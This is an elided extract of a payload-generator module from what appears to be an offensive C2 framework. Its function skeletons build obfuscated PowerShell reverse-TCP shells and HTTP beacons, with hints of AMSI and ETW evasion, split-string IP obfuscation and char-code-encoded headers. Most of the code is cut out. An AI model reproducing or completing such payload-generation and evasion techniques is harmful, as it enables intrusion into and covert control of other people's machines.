# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-GunnerC2\core\payload_generator.py
"""
...
def generate_windows_powershell_tcp(ip, port, obs, use_ssl, no_child=None):
    ...
    if obs == 1:
        obs1_payload = generate_windows_powershell_tcp_obfuscate_level1(
            raw, ip, port, use_ssl, no_child
        )
        if no_child:
            return obs1_payload
        ...
        obs2_payload = generate_windows_powershell_tcp_obfuscate_level2(
            raw, ip, port, use_ssl, no_child
        )
        if no_child:
            return obs2_payload
        ...
        obs3_payload = generate_windows_powershell_tcp_obfuscate_level3(
            raw, ip, port, use_ssl, no_child
        )
        if no_child:
            return obs3_payload
...
def generate_windows_powershell_tcp_obfuscate_level1(
    payload, ip, port, use_ssl: bool = False, no_child=None
):
    ip_parts = ip.split(".")
    ...
    if use_ssl:
        ...
        print(
            brightred
            + f"[-] ERROR failed to generate payload an unknown error ocurred!"
        )
...
def generate_windows_powershell_tcp_obfuscate_level2(
    raw, ip, port, use_ssl: bool = False, no_child=None
):
    """
...
def generate_windows_powershell_tcp_obfuscate_level3(
    raw, ip, port, use_ssl: bool = False, no_child=None
):
    ip_parts = ip.split(".")
    ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)
    ...
    rnd = lambda: "".join(
        random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4, 8))
    )
    v_amsi = rnd()
    v_etw = rnd()
    v_tcp = rnd()
...
def generate_windows_powershell_http(ip, port, beacon_interval, obs, no_child=None):
    ...
    if obs == 1:
        obs1_http_payload = generate_windows_powershell_http_obfuscate_level1(
            raw, ip, port, beacon_interval, no_child
        )
        if no_child:
        ...
        obs2_http_payload = generate_windows_powershell_http_obfuscate_level2(
            raw, ip, port, beacon_interval, no_child
        )
        if no_child:
            obs2_http_payload
...
def generate_windows_powershell_http_obfuscate_level1(
    raw, ip, port, beacon_interval, no_child=None
):
    beacon_url = f"http://{ip}:{port}/"
    interval = beacon_interval
...
def generate_windows_powershell_http_obfuscate_level2(
    raw, ip, port, beacon_interval, no_child=None
):
    """
    ...
    hdrs = {
        "X-Session-ID": [88, 45, 83, 101, 115, 115, 105, 111, 110, 45, 73, 68],
        "X-API-KEY": [88, 45, 65, 80, 73, 45, 75, 69, 89],
        "X-Forward-Key": [88, 45, 70, 111, 114, 119, 97, 114, 100, 45, 75, 101, 121],
    }
